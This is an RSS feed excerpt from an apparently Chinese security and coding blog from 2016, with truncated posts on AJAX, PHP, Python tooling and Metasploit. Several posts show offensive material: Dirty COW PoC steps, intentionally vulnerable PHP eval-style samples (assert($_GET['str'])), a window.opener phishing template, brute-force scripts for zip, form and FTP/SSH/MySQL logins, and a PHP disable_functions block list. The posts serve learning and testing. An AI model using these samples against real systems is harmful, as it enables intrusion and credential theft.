      <guid>http://wyb0.com/posts/2016/ajax-request-and-response/</guid>
      <description>0x00 什么是AJAX AJAX全称是Asynchronous JavaScript and XML，即异步的JavaScript和XML
AJAX不是新的编程语言，而是一种使用现有标准的新方法。
AJAX可在不重新加载整个页面的情况下与服务器交换数据从而更新部分网页
0x01 示例 &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;script&amp;gt; function loadXMLDoc() { var xmlhttp; if (window.XMLHttpRequest) {// code for IE7+,Firefox,Chrome,Opera,Safari xmlhttp=new XMLHttpRequest(); } else {// code for IE6, IE5 xmlhttp=new ActiveXObject(&amp;quot;Microsoft.XMLHTTP&amp;quot;); } xmlhttp.onreadystatechange=function(){ if (xmlhttp.readyState==4 &amp;amp;&amp;amp; xmlhttp.status==200) { document.getElementById(&amp;quot;myDiv&amp;quot;).innerHTML=xmlhttp.responseText; } } xmlhttp.open(&amp;quot;GET&amp;quot;,&amp;quot;/try/ajax/ajax_info.txt&amp;quot;,true); xmlhttp.send(); } &amp;lt;/script&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;div id=&amp;quot;myDiv&amp;quot;&amp;gt;&amp;lt;h2&amp;gt;使用 AJAX 修改该文本内容&amp;lt;/h2&amp;gt;&amp;lt;/div&amp;gt; &amp;lt;button type=&amp;quot;button&amp;quot; onclick=&amp;quot;loadXMLDoc()&amp;quot;&amp;gt;修改内容&amp;lt;/button&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt;  当点击&amp;rdquo;修改内容&amp;rdquo;后，文本就会改变，但html页面源码没变，只向服务器请求了文本
0x02 关于XHR XMLHttpRequest是AJAX的基础，就是它与后台就行交互的
现在大部分浏览器都支持XMLHttpRequest对象(IE5和IE6使用ActiveXObject)
//创建对象示例 var xmlhttp; if (window.</description>
    </item>
    
    <item>
      <title>脏牛漏洞</title>
      <link>http://wyb0.com/posts/2016/dirty-cow-vulnerabilities/</link>
      <pubDate>Sat, 22 Oct 2016 00:10:46 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/dirty-cow-vulnerabilities/</guid>
      <description>0x00 测试环境 我是在本地虚拟机测试的，个人理解这个漏洞的话可以起到的作用是：一个普通用户可以覆盖一个root用户的只读文件，若理解有误则希望大家提意见
CentOS release 6.5 [reber123@WYB ~]$ uname -a Linux WYB 3.10.5-3.el6.x86_64 #1 SMP Tue Aug 20 14:10:49 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux [reber123@WYB ~]$ id uid=502(reber123) gid=502(reber123) groups=502(reber123)  0x01 创建文件 查看文件权限信息，可以看到属主为root，且只读，权限为0404
[reber123@WYB ~]$ ls -al test -r-----r-- 1 root root 19 Oct 21 00:02 test [reber123@WYB ~]$ cat test this is not a test [reber123@WYB ~]$  0x02 编译、执行poc POC保存为a.c，编译为aaa
[reber123@WYB ~]$ gcc -lpthread a.c -o aaa [reber123@WYB ~]$ ls aaa a.</description>
    </item>
    
    <item>
      <title>代码执行漏洞(二)</title>
      <link>http://wyb0.com/posts/2016/code-execution-vulnerabilities-2/</link>
      <pubDate>Fri, 14 Oct 2016 13:16:32 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/code-execution-vulnerabilities-2/</guid>
      <description> 接着上一篇：代码执行漏洞(一) 0x00 函数create_function() php中的函数create_function()可以创建一个匿名函数，其函数原型如下：
string create_function ( string $args , string $code ) 其中$args是函数的参数，$code是函数的内容  若对提交的code未过滤或过滤不当则可能会导致代码执行漏洞
0x01 示例 示例a.php代码如下：
&amp;lt;?php $test = @$_GET[&#39;test&#39;]; $newfun = create_function(&#39;$a,$b&#39;, $test); $newfun(&#39;1111&#39;,&#39;2222&#39;); ?&amp;gt; 上述代码中$nuwfun(&#39;1111&#39;,&#39;2222&#39;)代表此时$a=&#39;1111&#39;,$b=&#39;2222&#39;,然后将其传给$test  0x02 函数assert() 这个函数和eval()的作用差不多
&amp;lt;?php @assert($_GET[&#39;str&#39;]); ?&amp;gt;  </description>
    </item>
    
    <item>
      <title>利用_blank属性钓鱼</title>
      <link>http://wyb0.com/posts/2016/use-blank-attribute-to-fish/</link>
      <pubDate>Wed, 12 Oct 2016 10:24:38 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/use-blank-attribute-to-fish/</guid>
      <description>0x00 _blank _blank是html中的标签属性，如&amp;lt;a target=&amp;quot;_blank&amp;quot; href=&amp;quot;http://xss.reber-9.com/1.php&amp;quot;&amp;gt;HELLO&amp;lt;/a&amp;gt;, 但若点击HELLO打开的网页1.php中有如下代码：
&amp;lt;script&amp;gt; if(window.opener){ window.opener.location = &amp;quot;http://xss.reber-9.com/fish.html&amp;quot;; } &amp;lt;/script&amp;gt;  则原网页将转跳到http://xss.reber-9.com/fish.html ，这就会造成钓鱼
0x01 简单模板  a.html内容如下：  &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt; &amp;lt;head&amp;gt; &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt; &amp;lt;title&amp;gt;Document&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;a target=&amp;quot;_blank&amp;quot; href=&amp;quot;http://xss.reber-9.com/1.php&amp;quot;&amp;gt;HELLO&amp;lt;/a&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt;   http://xss.reber-9.com/1.php中1.php内容如下：  &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;title&amp;gt;test&amp;lt;/title&amp;gt; &amp;lt;script&amp;gt; if(window.opener){ window.opener.location = &amp;quot;http://xss.reber-9.com/fish.html&amp;quot;; } &amp;lt;/script&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;p&amp;gt;hello&amp;lt;/p&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt;   1.php同级下有个钓鱼模板fish.html，内容如下：  &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;title&amp;gt;fish&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;h2&amp;gt;This is fishing template!&amp;lt;/h2&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt;   点击a.</description>
    </item>
    
    <item>
      <title>准则</title>
      <link>http://wyb0.com/posts/2016/principles/</link>
      <pubDate>Wed, 21 Sep 2016 23:05:57 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/principles/</guid>
      <description>0x00 创造价值 小鸡问母鸡：可否不用下蛋，带我出去玩啊？母鸡道：不行，我要工作！
小鸡说：可你已经下了这么多蛋了！母鸡意味深长地对小鸡说：一天一个蛋，菜刀靠边站，一月不生蛋，高压锅里见。
存在是因为你创造价值，淘汰是因为你失去价值。过去的价值不代表未来，所以每天都要努力！
0x01 韬光养晦 毛竹用了4年时间，仅仅长了3厘米，但从第5年开始，以每天30厘米的速度疯狂地生长，仅用6周，就长到了15米。其实，在前面的４年，毛竹将根在土壤里延伸了数百平方米。
做人做事亦是如此，不要担心付出得不到回报，因为这些付出都是为了扎根，等到时机成熟，你会登上别人遥不可及的巅峰。
0x02 感恩 乞丐：能不能给我一百块钱？
路人：我只有八十块钱。
乞丐：那你就欠我二十块钱吧。
不要总以为是上苍欠你的，老觉得老天爷给的不够多、不够好，不要让贪婪之欲取代了感恩之心。
0x05 宽容与谦卑 一滴墨汁落在一杯清水里，这杯水立即变色，不能喝了；一滴墨汁融在大海里，大海依然是蔚蓝色的大海。为什么？因为两者的肚量不一样。
不熟的麦穗直刺刺地向上挺着，成熟的麦穗低垂着头。为什么？因为两者的份量不一样。
宽容别人，就是肚量；谦卑自己，就是份量；合起来，就是一个人的质量。</description>
    </item>
    
    <item>
      <title>SqlmapApi常用方法封装</title>
      <link>http://wyb0.com/posts/2016/package-sqlmapapi-common-function/</link>
      <pubDate>Wed, 21 Sep 2016 17:37:33 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/package-sqlmapapi-common-function/</guid>
      <description>0x00 代码如下 #!/usr/bin/env python # -*- coding: utf-8 -*- import threading import requests import json from time import sleep class Sqli(threading.Thread): &amp;quot;&amp;quot;&amp;quot;docstring for AutoSqli&amp;quot;&amp;quot;&amp;quot; def __init__(self, server, target, data=&#39;&#39;, referer=&#39;&#39;, cookie=&#39;&#39;): threading.Thread.__init__(self) self.server = server[0:-1] if server[-1]==&#39;/&#39; else server self.target = target self.data = data self.referer = referer self.cookie = cookie self.taskid = &#39;&#39; self.data def new_task(self): url = &amp;quot;{}/task/new&amp;quot;.format(self.server) self.taskid = json.loads(requests.get(url).text)[&#39;taskid&#39;] if len(self.taskid)&amp;gt;0: print &amp;quot;Create new task,taskid is: %s&amp;quot; % self.</description>
    </item>
    
    <item>
      <title>Python爆破zip压缩包</title>
      <link>http://wyb0.com/posts/2016/python-blasting-zip-archive/</link>
      <pubDate>Tue, 20 Sep 2016 14:50:59 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/python-blasting-zip-archive/</guid>
      <description>0x00 代码 多线程爆破加密的zip压缩包
#!/usr/bin/env python # -*- coding: utf-8 -*- import sys import optparse import zipfile import threading import Queue queue = Queue.Queue() lock = threading.Lock() result = &#39;&#39; def load_pwd(filename): for line in open(filename,&#39;r&#39;): if line: queue.put(line.strip()) def bruter(zipname,queue): global result zFile = zipfile.ZipFile(zipname) while not queue.empty(): password = queue.get() try: zFile.extractall(pwd=password) # 解压 lock.acquire() print &amp;quot;[Ok] password is: %s&amp;quot; % password lock.release() result = password except: lock.acquire() print &amp;quot;[Error] password not is: %s&amp;quot; % password lock.</description>
    </item>
    
    <item>
      <title>Python实现代理</title>
      <link>http://wyb0.com/posts/2016/python-implement-agent/</link>
      <pubDate>Tue, 13 Sep 2016 11:36:39 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/python-implement-agent/</guid>
      <description>0x00 帮助信息 0x01 代码如下 #!/usr/bin/env python # -*- coding: utf-8 -*- &#39;This is a proxy&#39; __author__ = &#39;xxx&#39; import sys import socket import threading import optparse lock = threading.Lock() def locker(msg): lock.acquire() print msg lock.release() def hexdump (src,length=16):#十六进制导出函数 result = [] digits = 4 if isinstance(src,unicode) else 2 for i in xrange(0,len(src),length): s = src[i:i+length] hexa = b&#39; &#39;.join(&amp;quot;[%0*X]&amp;quot; % (digits,ord(x)) for x in s) text = b&#39;&#39;.join([x if 0x20 &amp;lt;= ord(x) &amp;lt; 0x7F else b&#39;.</description>
    </item>
    
    <item>
      <title>Python封装MySQL类</title>
      <link>http://wyb0.com/posts/2016/python-package-mysql-function/</link>
      <pubDate>Mon, 12 Sep 2016 22:54:28 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/python-package-mysql-function/</guid>
      <description>0x00 安装 有两种，一个是MySQLdb，一个是pymysql
 下载MySQL-python然后安装
 sudo pip install pymysql(推荐，因为py3已经不支持MySQLdb了)  0x01 简单表设计如下 insert into mysql.user(Host,User,Password) values(&#39;%&#39;,&#39;python&#39;,&#39;123456&#39;); drop database if exists python; create database python; use python; drop table if exists msg; create table msg( id int not null auto_increment primary key, ip varchar(40) not null default &#39;127.0.0.1&#39; comment &#39;ip地址&#39;, domain varchar(100) not null default &#39;www.xx.com&#39; comment &#39;域名&#39; ); grant all privileges on python.* to &#39;python&#39;@&#39;%&#39; identified by &#39;123456&#39;; flush privileges;  0x02 MySQLdb封装代码 #!</description>
    </item>
    
    <item>
      <title>Python爆破二级域名</title>
      <link>http://wyb0.com/posts/2016/python-blasting-secondary-domain/</link>
      <pubDate>Mon, 12 Sep 2016 21:31:37 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/python-blasting-secondary-domain/</guid>
      <description>Reference(侵删)：https://github.com/lijiejie/subDomainsBrute
0x00 帮助信息 0x01 代码 #!/usr/bin/env python # -*- coding: utf-8 -*- import dns.resolver import threading import Queue import optparse import sys queue = Queue.Queue() lock = threading.Lock() class GetSubDomain(threading.Thread): &amp;quot;&amp;quot;&amp;quot;docstring for SubDomain&amp;quot;&amp;quot;&amp;quot; def __init__(self, target,queue,outfile): threading.Thread.__init__(self) self.target = target self.queue = queue self.rsv = dns.resolver.Resolver() outfile = target + &#39;.txt&#39; if not outfile else outfile self.f = open(&#39;./output/&#39;+outfile,&#39;a+&#39;) self.ip_list = [] def _scan(self): while not self.queue.empty(): self.ip_list = [] ips = None sub_domain = self.</description>
    </item>
    
    <item>
      <title>Tmux的使用</title>
      <link>http://wyb0.com/posts/2016/tmux-usage/</link>
      <pubDate>Sat, 10 Sep 2016 16:24:18 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/tmux-usage/</guid>
      <description> 0x00 Tmux的快捷键前缀 Tmux 提供了一个快捷键前缀。当想要使用快捷键时，需要先按下快捷键前缀，然后再按下快捷键。比如想按快捷键c时，你需要：先按ctrl+b，松开后再按c
0x01 会话 0x02 窗口和窗格 </description>
    </item>
    
    <item>
      <title>POC框架Pocsuite</title>
      <link>http://wyb0.com/posts/2016/poc-framework-pocsuite/</link>
      <pubDate>Thu, 08 Sep 2016 20:38:45 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/poc-framework-pocsuite/</guid>
      <description>0x00 关于Pocsuite Pocsuite 是知道创宇安全研究团队打造的一款基于漏洞与 POC 的远程漏洞验证框架。可以让我们不用考虑过多的细节，只要考虑验证代码就可以，它封装了一些我们常用的东西，比如requests，在我们平常使用requests是要考虑cookie、要考虑header，但是在框架下则不需要有这些考虑，因为这些东西框架都帮你解决了。
0x01 简单介绍  安装  使用pip install pocsuite即可安装   常用参数  -u 指定一个目标url -f 指定一个存放目标url的文件 -r 指定一个存放poc的文件夹 &amp;ndash;report 导出结果到html文件 &amp;ndash;cookie 携带cookie &amp;ndash;referer 修改referer &amp;ndash;user-agent 修改UA  模式  执行一个poc有两种模式  --verify 漏洞验证模式(只是验证，不能更改服务器的东西) --attack 漏洞利用模式  示例  pocsuite -u &amp;quot;http://www.xxxx.com&amp;quot; -r poc_path/poc_name.py --atack   poc编写
 可以新建一个文件夹，命名为mypoc，里面就放你自己写的poc(当然也可以在mypoc里新建文件夹放一类poc，对poc进行分类) 此时示例(对目标进行常见服务的测试，加载一类多个poc脚本)  pocsuite -u &amp;quot;http://www.xxxx.com&amp;quot; -r poc_path/server/ --verify   poc的命名规范
 漏洞ID_版本号_漏洞类型(其中不能有大写字母，所有符号要改为&amp;quot;_&amp;quot;),大致如下：  _xxxx_struct2_2016_s2_016_code_execution.</description>
    </item>
    
    <item>
      <title>Python实现表单爆破</title>
      <link>http://wyb0.com/posts/2016/python-form-blasting/</link>
      <pubDate>Mon, 05 Sep 2016 23:43:22 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/python-form-blasting/</guid>
      <description>0x00 接收变量的php脚本如下 //代码仅供测试 &amp;lt;?php $name = @$_POST[&#39;uname&#39;]; $pass = @$_POST[&#39;upass&#39;]; if (empty($name) or empty($pass)){ header(&amp;quot;location:http://127.0.0.1:921/test/test/index.html&amp;quot;); exit(); } else { if ($name === &#39;admin&#39; and $pass === &#39;123456&#39;){ header(&amp;quot;location:http://127.0.0.1:921/test/test/sucess.html&amp;quot;); } else { header(&amp;quot;location:http://127.0.0.1:921/test/test/error.html&amp;quot;); exit(); } } ?&amp;gt;  0x01 爆破表单的python脚本如下 #!/usr/bin/env python # -*- coding: utf-8 -*- import hashlib import requests from Queue import Queue import threading from optparse import OptionParser from time import sleep lock = threading.Lock() queue = Queue() result = [] class FormBlast(threading.</description>
    </item>
    
    <item>
      <title>Sublime Text 3几个好用的插件</title>
      <link>http://wyb0.com/posts/2016/sublime-text3-plugins/</link>
      <pubDate>Fri, 02 Sep 2016 23:07:44 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/sublime-text3-plugins/</guid>
      <description>0x00 Package Control 安装完这个插件后可以更容易的管理(安装、删除、查看等)其他插件
 代码安装
ctrl+~快捷键调出console，将下面代码粘贴进去，然后Enter执行(注意单引号)  import urllib.request,os; pf = &#39;Package Control.sublime-package&#39;; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); open(os.path.join(ipp, pf), &#39;wb&#39;).write(urllib.request.urlopen( &#39;http://sublime.wbond.net/&#39; + pf.replace(&#39; &#39;,&#39;%20&#39;)).read())   手动安装
 点击https://sublime.wbond.net/Package%20Control.sublime-package 下载文件 将下载的文件放在root path/Data/Installed Packages下 重启Sublime Text  使用方法
 Ctrl+Shift+P调出菜单然后选择相应操作  Preferences -&amp;gt; Package Control也可调出  选择Install Package后可以输入想安装的插件名搜索安装    0x01 Emmet 前端必备插件，前身是Zen Coding，可高效编写HTML和CSS(需要依赖PyV8，会自动安装) 
0x02 Anaconda 可以自动补全并提示语法，还可跳转到定义、使用等 效果如下： 0x03 AutoFileName 快捷输入文件路径 0x04 主题Theme-SoDaReloaded 两个主题插件，安装好之后：首选项 -&amp;gt; 设置-用户，修改文件Packages/User/Preferences.</description>
    </item>
    
    <item>
      <title>PHP安全配置</title>
      <link>http://wyb0.com/posts/2016/php-safe-configuration/</link>
      <pubDate>Thu, 01 Sep 2016 08:46:03 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/php-safe-configuration/</guid>
      <description> 0x00 PHP的配置 PHP的配置文件为php.ini,其中有些项配置不当的话就会造成一些安全问题
0x01 远程文件包含  涉及配置项  allow_url_include  配置为On时允许进行远程文件包含  allow_url_fopen  配置为On时允许使用函数fopen、file_put_contents   配置方案  alllow_url_include = Off allow_url_fopen = Off   0x02 关闭错误回显  涉及配置项  display_errors  配置为On时会显示错误信息   配置方案  display_errors = Off log_errors = On error_log = /var/log/php_error.log   0x03 隐藏php版本  涉及配置项  expose_php  为Off时会隐藏php版本   配置方案  expose_php = Off   0x04 魔术引号  涉及配置项  magic_quotes_gpc  过滤get、post、cookie的单引号、双引号、反斜杠、空字符，但不过滤$_SERVER  magic_quotes_runtime  对文件或数据库中取出的数据进行过滤，可防止二次注入   配置方案  做逻辑判断时需要去掉反斜杠，所以用全局过滤框架做过滤吧   0x05 安全模式  涉及配置项  safe_mode  开启后安全系数提升，但会限制函数使用权限和操作目录文件权限等   配置方案  在安全模式下可以使用safe_mode_include_dir = /var/www/common来排除某些文件   0x06 目录权限控制  涉及配置项  open_basedir  开启后可将用户访问范围限定，可防止跨站，但会影响性能   配置方案  open_basedir = /var/www/web1/:/var/www/web2/ (后面的斜杠不能少)   0x07 禁止函数  涉及配置项  disable_functions  禁止某些命令执行函数和文件操作函数的使用   配置方案  disable_functions = system,passthru,exec,shell_exec,popen,pcntl_exec, proc_open,chdir,chroot,getcwd,readdir,mkdir,copy,file_get_contents,   0x08 注册全局变量  涉及配置项  register_globals  值为On是会开启全局注册变量功能   配置方案  register_globals = Off   </description>
    </item>
    
    <item>
      <title>Python的模块</title>
      <link>http://wyb0.com/posts/2016/python-module/</link>
      <pubDate>Wed, 31 Aug 2016 11:22:41 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/python-module/</guid>
      <description>0x00 Python的模块  在python中，任何一个python文件都可以看作一个模块 不同包下有相同模块名并不会冲突，且包下必须有文件__init__.py from lib import * 意思是从包lib中导入所有模块(若lib为模块名则为导入模块的所有函数) from lib.module1 import test 意思是从lib这个包下的module1模块中导入函数test import导入模块时会从sys.path输出的结果路径中查找模块然后导入 sys.path.append(&#39;D:/xx/xx/xx/code&#39;)可以添加搜索路径 使用if __name__ == &#39;__main__&#39;:  0x01 实例  文件结构如下   测试文件test.py  #!/usr/bin/env python # -*- coding: utf-8 -*- from package1 import * #导入包package1下的所有模块 import package2.module3 #导入包package2下的module3模块 import package2.module4 as s #导入包package2下的module4模块并重命名为s a = module1.Class1() #创建一个对象 a.test() #调用类中的方法 b = module2.Class2() b.test() c = package2.module3.Class3() c.test() d = s.Class4() d.test()   包package1</description>
    </item>
    
    <item>
      <title>Python实现密码生成器</title>
      <link>http://wyb0.com/posts/2016/python-password-generator/</link>
      <pubDate>Mon, 29 Aug 2016 15:14:57 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/python-password-generator/</guid>
      <description>0x00 简介 有时候需要在网上注册许多账号，如果每个账户密码都一样的话，若被别人得知一个密码则所有账户就都沦陷了，若密码不一样则可能会忘记，在这里就用脚本写一个生成密码的工具，只需输入域名和账户名就可以根据key生成不一样的密码，也可以把域名和账户名写入文件，这样你用户名也可以不用记了。。。
0x01 代码如下 #!/usr/bin/env python # -*- coding: utf-8 -*- import hashlib import sys import os import optparse import json import msvcrt def get_md5(string): md5 = hashlib.md5() md5.update(string) s = md5.hexdigest() return s def get_domain(): if os.path.exists(&#39;account.txt&#39;): data = {} with open(&#39;account.txt&#39;, &#39;r&#39;) as f: lines = f.readlines() for line in lines: line = line.split(&#39;*&#39;) data[line[0]] = line[1].strip() else: pass return data def get_pass(): pwd = [] while True: nchar = msvcrt.</description>
    </item>
    
    <item>
      <title>Python实现多线程弱口令爆破</title>
      <link>http://wyb0.com/posts/2016/python-multi-threaded-weak-password-blasting/</link>
      <pubDate>Fri, 26 Aug 2016 17:53:51 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/python-multi-threaded-weak-password-blasting/</guid>
      <description>0x00 脚本 #!/usr/bin/env python # -*- coding: utf-8 -*- &#39;this script can bruter ftp/ssh/mysql&#39; __author__ = &#39;reber&#39; import Queue import threading import time import logging import socket from optparse import OptionParser import paramiko from ftplib import FTP import MySQLdb #################公有类################# class CommonFun(object): &amp;quot;&amp;quot;&amp;quot;docstring for CommonFun&amp;quot;&amp;quot;&amp;quot; def __init__(self): super(CommonFun, self).__init__() def set_log(self,lname): logger = logging.getLogger(lname) logger.setLevel(logging.DEBUG) ch = logging.StreamHandler() ch.setLevel(logging.DEBUG) formatter = logging.Formatter(&#39;%(asctime)s - %(name)s - %(levelname)s - %(message)s&#39;) ch.setFormatter(formatter) logger.</description>
    </item>
    
    <item>
      <title>Python的异常处理</title>
      <link>http://wyb0.com/posts/2016/python-exception-handling/</link>
      <pubDate>Fri, 26 Aug 2016 10:40:44 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/python-exception-handling/</guid>
      <description> 0x00 Python异常处理 #!/usr/bin/env python # -*- coding: utf-8 -*- try: try: # 可嵌套 str(&amp;quot;aaaaa&amp;quot;) # int(&amp;quot;aaaaa&amp;quot;) # print a # print 1/0 except (TypeError, IndexError, ValueError): #捕获多种异常 print &amp;quot;TypeErrorZero or DivisionError or ValueError&amp;quot; except ZeroDivisionError as aa: #捕获除零错误 print aa #输出详细错误信息 except: print u&amp;quot;发生其他异常则执行这里&amp;quot; else: print u&amp;quot;上面没有出错才输出这里&amp;quot; a = [1,2,3] print a[4] #这里出错，会向上抛出错误，最终输出this is error finally: print u&amp;quot;不管是否出错都输出这里，一般用于释放资源，如关闭文件&amp;quot; except Exception as e: #可捕获所有异常类型 print &amp;quot;this is error&amp;quot; print e  </description>
    </item>
    
    <item>
      <title>Metasploit利用workspace进行批量扫描爆破</title>
      <link>http://wyb0.com/posts/2016/metasploit-use-workspace-batch-blasting/</link>
      <pubDate>Tue, 23 Aug 2016 10:05:52 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/metasploit-use-workspace-batch-blasting/</guid>
      <description>0x00 启动 0x01 Metasploit的工作平台 在msf里的工作平台可以保存历史的一些操作信息 0x02 使用db_nmap扫描主机 扫描后的结果会保留在工作平台中，可以用hosts和services进行查看： 0x03 使用msf的模块进行弱口令爆破 注：这里针对ftp服务进行弱口令测试 使用vulns可以查看结果：msf auxiliary(ftp_login) &amp;gt; vulns</description>
    </item>
    
    <item>
      <title>Python的一些小模块</title>
      <link>http://wyb0.com/posts/2016/python-some-small-modules/</link>
      <pubDate>Fri, 19 Aug 2016 19:42:14 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/python-some-small-modules/</guid>
      <description>0x00 colorama 这个模块可以输出带有颜色的字符
#!/usr/bin/env python # -*- coding: utf-8 -*- import colorama colorama.init() print &amp;quot;{f_color}{content}{g_color}&amp;quot;.format(f_color=colorama.Fore.CYAN,content=&#39;debug&#39;,g_color=colorama.Fore.RESET) print &amp;quot;{f_color}{content}{g_color}&amp;quot;.format(f_color=colorama.Fore.YELLOW,content=&#39;warning&#39;,g_color=colorama.Fore.RESET) print &amp;quot;{f_color}{content}{g_color}&amp;quot;.format(f_color=colorama.Fore.RED,content=&#39;error&#39;,g_color=colorama.Fore.RESET)  0x01 pyfiglet 可以输出字体的图片效果
from pyfiglet import figlet_format print figlet_format(&amp;quot;reber&amp;quot;, font=&amp;quot;xtty&amp;quot;) #font可以控制输出的类型  0x02 chardet 这个模块可以用来判断你的字符串(除了Unicode类型)是什么类型的编码
#!/usr/bin/env python #-*- coding:utf-8 -*- import chardet import requests resp = requests.get(&amp;quot;https://tower.im/users/sign_in&amp;quot;) html = resp.content if not isinstance(html,unicode): code = chardet.detect(html) print code #输出当前的编码方式 #解码为unicode，然后编码为gbk str1 = html.decode(code[&#39;encoding&#39;]).encode(&#39;gbk&#39;) print chardet.detect(str1) start = str1.find(&#39;&amp;lt;title&amp;gt;&#39;) stop = str1.</description>
    </item>
    
    <item>
      <title>Ubuntu下安装Metasploit</title>
      <link>http://wyb0.com/posts/2016/ubuntu-install-metasploit/</link>
      <pubDate>Thu, 18 Aug 2016 10:38:41 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/ubuntu-install-metasploit/</guid>
      <description> 0x00 安装Metasploit  下载msfinstall脚本
$ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &amp;gt; msfinstall  修改文件权限
$ chmod 755 msfinstall  安装(可能时间较久)
$ ./msfinstall  更新exp
$ msfupdate   0x01 连接数据库  首先启动postgresql数据库
$ /etc/init.d/postgresql start #service postgresql start也可以  初始化MSF数据库(关键步骤)
$ msfdb init  运行msfconsole
$ msfconsole  在msf中查看数据库连接状态
msf &amp;gt; db_status #若出现错误：Module database cache not built yet, using slow search #则重新构建缓存，缓存构建通常需要5-10分钟左右。 #构建完成后，退出Metasploit控制台，然后重新进入即可使用数据库缓存进行搜索模块 msf &amp;gt; db_rebuild_cache   </description>
    </item>
    
    <item>
      <title>Python的optparse模块</title>
      <link>http://wyb0.com/posts/2016/python-module-optparse/</link>
      <pubDate>Tue, 16 Aug 2016 15:10:44 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/python-module-optparse/</guid>
      <description> 0x00 关于optparse模块 python2.3之后添加的模块optparse是专门用来处理命令行选项的
import optparse parser = optparse.OptionParser(usage=&#39;Usage: %prog [options] domaion&#39;, version=&#39;%prog 1.2&#39;) parser.add_option(&#39;-b&#39;, &#39;--bug&#39;, dest=&#39;isbug&#39;, default=False, action=&#39;store_true&#39;, help=&#39;Whether open the debug mode, default is false&#39;) parser.add_option(&#39;-u&#39;, &#39;--url&#39;, dest=&#39;url&#39;, default=None, action=&#39;store&#39;, type=&#39;string&#39;, help=&#39;target url&#39;) parser.add_option(&#39;-n&#39;,&#39;--number&#39;, dest=&#39;num&#39;, default=10, type=&#39;int&#39;, help=&#39;the number, default is 10&#39;) (options, args) = parser.parse_args() print options print args print options.url # parser.print_help() # show help message  0x01 说明 在输出帮助信息时%prog会被脚本名代替 -b和--bug作用一样，一个是短标签一个是长标签 dest：它是存储变量值的变量名 default：默认的值 type：值的类型，默认为string，可以不用写 action：有3种类型 默认action=&#39;store&#39;，可以不用写 action=&#39;store_true&#39;使用参数时将布尔值true存储到dest指定的变量中 action=&#39;store_false&#39;使用参数时将布尔值false存储到dest指定的变量中  </description>
    </item>
    
    <item>
      <title>BurpSuite抓手机包</title>
      <link>http://wyb0.com/posts/2016/burpsuite-intercept-packets-of-phone/</link>
      <pubDate>Sat, 13 Aug 2016 23:53:39 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/burpsuite-intercept-packets-of-phone/</guid>
      <description> 0x00 环境设置 Windows Phone手机和电脑处于同一无线环境下： 0x01 BurpSuite设置 0x02 抓HTTP包 0x03 抓HTTPS包  挂burpsuite的代理下载证书  把证书上传到你自己的服务器上(也可以本地搭建网站)，然后手机访问证书
安卓手机修改证书后缀为crt，证书可以放在网站上，也可以直接拖到手机上，然后安装  抓https数据包   </description>
    </item>
    
    <item>
      <title>Linux下虚拟主机搭建多站点</title>
      <link>http://wyb0.com/posts/2016/linux-virtual-host-build-multi-site/</link>
      <pubDate>Fri, 12 Aug 2016 08:39:35 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/linux-virtual-host-build-multi-site/</guid>
      <description>环境：CentOS-6.5-x86_64-minimal
0x00 搭建LAMP  安装Apache
yum install httpd  安装MySQL
 yum install mysql mysql-server 设置数据库
[reber@localhost conf]$ sudo mysql_secure_installation # 更新root密码： [reber@localhost conf]$ mysql -uroot –p mysql&amp;gt; use mysql; mysql&amp;gt; update user set password=password(&#39;123456&#39;) where user=&#39;root&#39;; mysql&amp;gt; flush privileges; //不想重启mysql就使新密码生效就需要运行此命令刷新 mysql&amp;gt; insert into mysql.user(Host,User,Password) values(&amp;quot;localhost&amp;quot;,&amp;quot;blog&amp;quot;,password(&amp;quot;123456&amp;quot;)); # mysql&amp;gt; detele form mysql.user where User=&#39;blog&#39; and Host=&#39;localhost&#39;; //这步可以删除用户 mysql&amp;gt; flush privileges; //刷新 mysql&amp;gt; create database db_blog; Query OK, 1 row affected (0.</description>
    </item>
    
    <item>
      <title>Python的scapy模块简单使用</title>
      <link>http://wyb0.com/posts/2016/python-module-scapy/</link>
